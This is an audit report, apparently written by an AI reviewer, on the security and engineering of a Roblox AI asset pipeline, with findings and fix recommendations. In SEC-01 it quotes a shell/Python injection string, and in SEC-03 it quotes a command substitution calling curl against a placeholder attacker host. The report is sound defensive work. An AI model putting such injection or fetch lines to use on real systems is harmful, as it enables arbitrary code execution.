# Roblox AI Pipeline — Final Security & Technical Audit Report

**Date:** 2026-03-18  
**Auditor:** Claude (automated deep review)  
**Scope:** Full repository — all Python scripts, Bash scripts, tests, CI, dependencies  
**Codebase:** ~5,200 lines across 24 source/test files  
**Test Suite:** 175 tests (all passing, 2 skipped)

---

## 1. Executive Summary

The Roblox AI Pipeline is in **strong shape** for a v1.0 release. The codebase demonstrates good engineering practices: consistent error handling, well-structured test coverage, proper use of environment variables for secrets, and thoughtful architecture with idempotent batch operations and resume capability.

**Overall Security Posture: GOOD** — No critical (P0) vulnerabilities found. Several P1/P2 findings exist that should be addressed before public release or team deployment, but none represent an active exploitable threat in the intended development-tool context.

**Overall Technical Health: STRONG** — The architecture is clean, modular, and testable. The pipeline orchestrator (`pipeline.sh`) properly chains stages with fail-fast behavior. Cost tracking, validation, and registry management work correctly.

| Category | Rating | Notes |
|----------|--------|-------|
| Security | 🟡 Good | No P0s. Several hardening opportunities. |
| Architecture | 🟢 Strong | Clean separation, proper error handling |
| Test Coverage | 🟢 Strong | 175 tests, all passing, good mocking strategy |
| Code Quality | 🟢 Strong | Consistent style, well-documented |
| Dependencies | 🟡 Good | No known CVEs, but versions unpinned |

---

## 2. Critical Vulnerabilities (P0)

**None found.** ✅

---

## 3. Security Findings

### SEC-01: Shell Injection via Inline Python in pipeline.sh (P1 — Medium)

**File:** `scripts/pipeline.sh`, lines 149-162  
**Severity:** P1 — Medium (requires attacker-controlled `--name` input)

In the dry-run registry-injection block, shell variables are interpolated directly into a Python heredoc:

```bash
python3 - <<PYEOF
import json, pathlib
reg_path = pathlib.Path("$REGISTRY")
reg = json.loads(reg_path.read_text()) if reg_path.exists() else {}
reg["$KEY"] = {
    "assetId": "000000000",
    "displayName": "$ASSET_NAME",
    ...
PYEOF
```

If `$ASSET_NAME` contains a double quote and Python syntax (e.g., `"}, exec("malicious")); #`), it would escape the string and execute arbitrary Python code. This is dry-run-only and requires the user to pass malicious `--name` arguments to their own tool, so exploitation is unlikely in practice.

**Recommendation:** Pass variables as environment variables and read them with `os.environ` inside the Python block, or use `json.dumps()` to safely serialize:
```bash
ASSET_NAME="$ASSET_NAME" KEY="$KEY" REGISTRY="$REGISTRY" python3 -c '
import json, os, pathlib
reg_path = pathlib.Path(os.environ["REGISTRY"])
...'
```

---

### SEC-02: Dependency Versions Not Pinned (P1 — Medium)

**File:** `requirements.txt`

```
anthropic
openai
requests
tqdm
pyyaml
python-dotenv
click
pytest
pytest-mock
responses
pytest-cov
```

All dependencies are unpinned. A supply-chain attack on any of these packages (especially `requests`, `pyyaml`, or `anthropic`) could introduce malicious code.

**Recommendation:** Pin exact versions or at minimum pin major+minor versions:
```
anthropic>=0.40.0,<1.0
openai>=1.50.0,<2.0
requests>=2.31.0,<3.0
pyyaml>=6.0,<7.0
# etc.
```
Consider using `pip-compile` (pip-tools) or `uv` to generate a lockfile.

---

### SEC-03: `.env` File Sourced Without Sanitization (P2 — Low)

**File:** `scripts/pipeline.sh`, lines 34-38

```bash
if [[ -f "$PROJECT_ROOT/.env" ]]; then
    set -a
    source "$PROJECT_ROOT/.env"
    set +a
fi
```

The `.env` file is `source`d as a bash script. If the `.env` file contains bash commands beyond simple `KEY=value` assignments (e.g., `$(curl attacker.com)`), they would execute. This is standard practice with dotenv files, but worth noting.

**Mitigations already in place:**
- `.env` is in `.gitignore` ✅
- `.env.example` contains no real values ✅

**Recommendation:** Consider validating that `.env` only contains `KEY=value` lines, or switch to Python-only `.env` loading via `python-dotenv` (which is already used and is safe).

---

### SEC-04: No API Key Format Validation (P2 — Low)

**Files:** `scripts/generate_3d_asset.py`, `scripts/upload_asset.py`, `scripts/generate_luau.py`

API keys are read from environment but never validated for format before being sent to third-party services. A misconfigured key (e.g., containing newlines or special characters) could cause confusing errors or be sent in headers in unexpected ways.

**Recommendation:** Add basic validation (non-empty, reasonable length, no whitespace):
```python
def validate_api_key(key: str, name: str) -> str:
    if not key or not key.strip():
        raise click.ClickException(f"{name} is empty or whitespace-only")
    if len(key) > 256:
        raise click.ClickException(f"{name} appears malformed (too long)")
    return key.strip()
```

---

### SEC-05: Generated Luau Code Written to Disk Without Sandboxing (P2 — Informational)

**Files:** `scripts/generate_luau.py`, `scripts/generate_luau_openai.py`

LLM-generated code is written directly to `--output` paths. The `--output` path accepts any file path on the filesystem (including symlinks). A malicious or confused spec file could instruct the LLM to generate content targeting a sensitive file path.

**Mitigations:**
- This is a developer tool run locally by the user who controls all inputs
- The `--output` flag is explicitly provided by the operator
- The Luau validator runs before writing (catches some issues)

**Recommendation:** For defense-in-depth, validate that the output path is within the project directory:
```python
project_root = Path(__file__).resolve().parent.parent
if not out_path.resolve().is_relative_to(project_root):
    raise click.ClickException("Output path must be within the project directory")
```

---

### SEC-06: `tqdm` Listed as Dependency but Never Imported (P2 — Hygiene)

**File:** `requirements.txt`

`tqdm` is listed in requirements but never imported anywhere in the codebase. This is unnecessary attack surface.

**Recommendation:** Remove `tqdm` from `requirements.txt`.

---

### SEC-07: YAML Loading Uses `safe_load` ✅ (Positive Finding)

**File:** `scripts/batch_generate_assets.py`, line 64

```python
data = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
```

The codebase correctly uses `yaml.safe_load()` instead of the dangerous `yaml.load()`. This prevents YAML deserialization attacks. Well done.

---

### SEC-08: No Sensitive Data in Git History ✅ (Positive Finding)

The `.gitignore` correctly excludes:
- `.env` and `.env.local`
- `.assistant_id` (OpenAI state)
- Generated binary assets (`.fbx`, `.obj`, `.glb`)
- Cost logs

---

## 4. Architectural & Robustness Findings

### ARCH-01: No Retry Logic for Roblox Upload API (P1 — Medium)

**File:** `scripts/upload_asset.py`, `upload_asset()` function

The Meshy API functions (`create_preview_task`, `create_refine_task`) have retry logic with exponential backoff for 429 errors, but the Roblox upload (`upload_asset()`) has **no retry logic at all**. A transient network error or rate limit during upload will fail the entire pipeline.

**Recommendation:** Add retry logic consistent with the Meshy functions:
```python
for attempt in range(MAX_RETRIES):
    try:
        resp = requests.post(...)
        if resp.status_code == 429:
            time.sleep(2 ** (attempt + 1))
            continue
        break
    except requests.RequestException:
        if attempt == MAX_RETRIES - 1:
            raise
        time.sleep(2 ** attempt)
```

---

### ARCH-02: Infinite Polling Loop in Meshy `poll_task` (P1 — Medium)

**File:** `scripts/generate_3d_asset.py`, `poll_task()` function

Unlike `poll_operation()` in `upload_asset.py` (which has `MAX_POLL_ATTEMPTS = 60`), the Meshy `poll_task()` runs in an **infinite `while True` loop** with no timeout. If the Meshy API never returns `SUCCEEDED` or `FAILED` (e.g., returns `IN_PROGRESS` indefinitely due to a bug), this will hang forever.

**Recommendation:** Add a maximum poll count or time-based timeout:
```python
MAX_POLL_ATTEMPTS = 120  # 20 minutes at 10s intervals
for attempt in range(MAX_POLL_ATTEMPTS):
    # ... existing poll logic
raise click.ClickException(f"Timed out waiting for {label} after {MAX_POLL_ATTEMPTS * POLL_INTERVAL}s")
```

---

### ARCH-03: Pipeline Has No Partial-Recovery / Checkpoint State (P2 — Medium)

**File:** `scripts/pipeline.sh`

The pipeline runs 4 sequential steps. If step 3 fails (e.g., AssetIds.luau generation), the user must re-run the entire pipeline including re-uploading to Roblox (which counts as a new asset upload). There's no checkpoint file recording which steps completed.

The batch generator (`batch_generate_assets.py`) has excellent resume/progress tracking, but the main `pipeline.sh` does not.

**Recommendation:** Add a `.pipeline-state.json` checkpoint file:
```json
{
  "prompt": "Low-poly sword",
  "step": 3,
  "model_file": "assets/models/sword.fbx",
  "asset_id": "999111222",
  "started_at": "2026-03-18T09:00:00Z"
}
```
On re-run, detect existing state and offer to resume from the last successful step.

---

### ARCH-04: Cost Tracking for Meshy Logs $0.00 (P2 — Low)

**File:** `scripts/generate_3d_asset.py`, lines 203-209 and 227-233

```python
log_cost(
    script="generate_3d_asset",
    model="meshy-refine",
    tokens_in=0,
    tokens_out=0,
    cost_usd=0.0,  # Meshy uses credits, not per-token billing
)
```

Meshy API calls are logged with `$0.00` cost. This makes the cost summary misleading — it shows API calls but no cost for 3D generation, which is actually the most expensive part of the pipeline.

**Recommendation:** Either:
1. Log estimated Meshy credit costs (e.g., ~$0.10/preview, ~$0.40/refine based on their pricing)
2. Add a `credits` column to the CSV for non-token-based services
3. At minimum, add a comment in the cost summary output noting Meshy costs are tracked separately

---

### ARCH-05: Registry File Has No Locking (P2 — Low)

**File:** `scripts/upload_asset.py`, `register_asset()` function

The `asset-registry.json` is read, modified, and written back without file locking. If two pipeline instances run concurrently (e.g., in parallel CI), one could overwrite the other's changes.

**Recommendation:** Use `fcntl.flock()` for file-level locking:
```python
import fcntl
with open(registry_path, "r+") as f:
    fcntl.flock(f, fcntl.LOCK_EX)
    registry = json.load(f)
    # ... modify ...
    f.seek(0)
    json.dump(registry, f, indent=2)
    f.truncate()
```

---

### ARCH-06: `sys.path.insert(0, ...)` in Tests and Scripts (P2 — Code Smell)

**Files:** `scripts/batch_generate_assets.py`, all test files

Multiple files use `sys.path.insert(0, ...)` to resolve imports. This is fragile and can lead to import shadowing.

**Recommendation:** Add a `pyproject.toml` with proper package configuration:
```toml
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.backends._legacy:_Backend"

[project]
name = "roblox-ai-pipeline"
version = "1.0.0"

[tool.setuptools.packages.find]
include = ["scripts*"]
```
Then install with `pip install -e .` and use normal imports.

---

## 5. Code Quality & Test Suite Assessment

### Test Suite: STRONG ✅

- **175 tests, all passing** (2 skipped due to optional `openai` dependency)
- **Run time:** 0.27 seconds — excellent
- **Coverage areas:**
  - Unit tests for every validation rule in `validate_luau.py` ✅
  - Integration tests for full pipeline flows (mocked APIs) ✅
  - CLI tests using `CliRunner` ✅
  - Edge cases: empty registries, missing files, corrupted progress, timeout ✅
  - Retry logic for rate limits ✅
  - Resume/idempotency for batch generation ✅

### Test Gaps Identified

| Gap | Severity | Description |
|-----|----------|-------------|
| No `pipeline.sh` integration test | Medium | The bash orchestrator is tested only via CI dry-run, not in pytest |
| No test for concurrent registry writes | Low | Related to ARCH-05 |
| No test for `scrape-roblox-docs.sh` | Low | Could fail silently if URLs change |
| No test for `cost_tracker.summarize_costs` edge cases | Low | Empty CSV file with only header not tested |
| No negative test for `download_model` HTTP errors | Low | Only success path tested |
| `validate_fbx` not tested for directory traversal | Low | CLI accepts any path |

### Code Quality: STRONG ✅

**Positives:**
- Consistent use of type annotations across all Python code
- Comprehensive docstrings on all public functions
- Proper use of `click` for CLI framework (not raw `argparse`)
- All shell scripts use `set -euo pipefail` ✅
- Proper error messages that tell the user what to do
- `python-dotenv` used consistently for environment management
- Clean separation between library functions and CLI entry points

**Minor Code Smells:**

1. **Duplicated `strip_markdown_fences()`** — Identical function exists in both `generate_luau.py` and `generate_luau_openai.py`. Extract to a shared utility module.

2. **Duplicated validation integration** — Both `generate_luau.py` and `generate_luau_openai.py` have identical blocks for running `validate_luau` on generated output. Extract to a shared function.

3. **`file=open(f, "rb")` without context manager** in `generate_luau_openai.py` line 112:
   ```python
   uploaded = client.files.create(
       file=open(f, "rb"), purpose="assistants"
   )
   ```
   This file handle is never explicitly closed. Use a context manager:
   ```python
   with open(f, "rb") as fh:
       uploaded = client.files.create(file=fh, purpose="assistants")
   ```

4. **Mixed import styles** — Some test files do `sys.path.insert` then import from module name; others import from `scripts.module_name`. Standardize.

---

## 6. CI/CD Assessment

### GitHub Actions: GOOD ✅

Two workflow files provide:
1. **`test.yml`** — Compile checks + dry-run (basic)
2. **`validate.yml`** — Full test suite with coverage + Selene lint + pipeline dry-run

**Issue: Duplicate workflow names.** Both are named `"Validate Pipeline Scripts"`. The first (`test.yml`) is a subset of the second (`validate.yml`) and appears to be a leftover.

**Recommendation:** Remove `test.yml` or rename it. The `validate.yml` workflow already covers everything `test.yml` does plus more.

**Positive:** CI correctly uses dummy API keys and documents how to set up real smoke tests separately.

---

## 7. Recommended Final Fixes (Path to 100% v1.0)

### Must-Fix (before v1.0 release)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 1 | **SEC-01:** Fix shell injection in `pipeline.sh` dry-run heredoc | 15 min | Eliminates injection vector |
| 2 | **SEC-02:** Pin dependency versions in `requirements.txt` | 10 min | Supply-chain hardening |
| 3 | **ARCH-02:** Add timeout to Meshy `poll_task()` infinite loop | 5 min | Prevents pipeline hangs |
| 4 | **SEC-06:** Remove unused `tqdm` dependency | 1 min | Reduces attack surface |
| 5 | Remove duplicate CI workflow (`test.yml`) | 1 min | Reduces confusion |

### Should-Fix (for production readiness)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 6 | **ARCH-01:** Add retry logic to Roblox upload | 20 min | Resilience to transient failures |
| 7 | **ARCH-04:** Log realistic Meshy costs | 10 min | Accurate cost visibility |
| 8 | Fix unclosed file handle in `generate_luau_openai.py` | 2 min | Resource leak |
| 9 | Extract duplicated `strip_markdown_fences()` to shared module | 10 min | DRY principle |
| 10 | Extract duplicated validation block to shared function | 10 min | DRY principle |

### Nice-to-Have (for v1.1+)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| 11 | **ARCH-03:** Add pipeline checkpoint/resume state | 1-2 hrs | Better UX for long pipelines |
| 12 | **ARCH-05:** Add file locking for registry | 30 min | Concurrency safety |
| 13 | **ARCH-06:** Proper Python packaging with `pyproject.toml` | 30 min | Clean imports |
| 14 | **SEC-05:** Validate output paths are within project | 5 min | Defense-in-depth |
| 15 | Add `download_model` negative test (HTTP errors) | 10 min | Test coverage |

---

## 8. Appendix: File-by-File Security Notes

| File | Status | Notes |
|------|--------|-------|
| `scripts/pipeline.sh` | 🟡 | Shell injection in dry-run heredoc (SEC-01) |
| `scripts/upload_asset.py` | 🟢 | Clean. Missing retry on upload (ARCH-01). |
| `scripts/generate_3d_asset.py` | 🟡 | Infinite poll loop (ARCH-02) |
| `scripts/generate_luau.py` | 🟢 | Clean. Properly handles API errors. |
| `scripts/generate_luau_openai.py` | 🟡 | Unclosed file handle. Otherwise clean. |
| `scripts/validate_fbx.py` | 🟢 | Good boundary validation. |
| `scripts/validate_luau.py` | 🟢 | Path resolution with `.resolve()`. |
| `scripts/cost_tracker.py` | 🟢 | Clean. CSV append-only pattern is safe. |
| `scripts/batch_generate_assets.py` | 🟢 | Excellent resume logic. `safe_load` for YAML. |
| `examples/*/run.sh` | 🟢 | Simple wrappers. No issues. |
| `docs/*.sh` | 🟢 | Hardcoded URLs only. No user input. |
| `.env.example` | 🟢 | Placeholder values only. |
| `.gitignore` | 🟢 | Correctly excludes secrets and binaries. |
| `requirements.txt` | 🟡 | Unpinned versions (SEC-02). Unused `tqdm` (SEC-06). |
| CI workflows | 🟡 | Duplicate workflow. Otherwise well-structured. |

---

*End of audit. This codebase is 95% ready for v1.0. The 5 must-fix items above total ~30 minutes of work and would bring it to release quality.*
